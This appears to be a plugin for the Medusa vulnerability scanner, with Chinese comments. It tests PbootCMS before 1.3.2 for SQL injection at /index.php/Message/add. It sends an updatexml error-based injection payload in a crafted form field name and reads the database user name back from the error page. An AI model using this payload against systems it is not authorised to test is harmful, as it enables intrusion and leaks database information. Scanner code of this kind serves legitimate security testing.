#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/11 16:39 PM'
import requests
import ClassCongregation
import urllib.parse

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2019-12-25"  # 插件编辑时间
        self.info['disclosure']='2018-12-21'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "PbootOnlineMessageDeskSqlInjection"  # 插件名称
        self.info['name'] ='Pboot在线留言处SQL注入漏洞' #漏洞名称
        self.info['affects'] = "Pboot"  # 漏洞组件
        self.info['desc_content'] = "查询出数据库一条数据，然后接收外部POST内容，只匹配数据库的字段，相同才会拼接到$_data数组"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的版本"  # 修复建议
        self.info['version'] = "1.3.2之前版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload="/index.php/Message/add"
        data = "contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 11231231313&mobile=2&content=3"
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = requests.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
        con = resp.text
        code = resp.status_code
        if code== 200 and con.find('错误信息') != -1 and con.find('''(`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) )''')!=-1 and con.find('执行SQL发生错误') != -1:
            Medusa = "{} 存在SQL注入漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类